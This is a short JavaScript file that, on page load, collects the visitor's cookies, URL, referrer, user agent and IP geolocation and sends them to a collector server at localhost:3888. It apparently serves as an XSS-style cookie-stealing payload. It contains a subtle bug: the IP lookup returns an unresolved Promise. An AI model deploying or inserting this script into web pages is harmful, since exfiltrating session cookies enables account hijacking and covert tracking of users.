window.addEventListener("load", function (event) {
    let urlObj = {
        method: 'get',
        url: 'localhost:3888',
        params: {
            time: getTime(),
            ipinfo: getIpinfo(),
            url: getUrl(),
            refer: getRefer(),
            agent: getAgent(),
            cookie: getCookie(),
        },
    };
    axios(urlObj);
});

function getTime() {
    let nowDate = new Date();
    return nowDate.toLocaleDateString();
}
async function getIpinfo() {
    let info = await axios({
        method: 'get',
        url: '//ip-api.com/json',
    }).then((result) => {
        return result.data; 
    }).catch((err) => {
        console.log('请求ip信息出错');
        console.log(err);  
    });
    return info;
}
function getUrl() {
    return window.location.href
}
function getRefer() {
    return document.referrer;
}
function getAgent() {
    return navigator.userAgent;
}
function getCookie() {
    return document.cookie;
}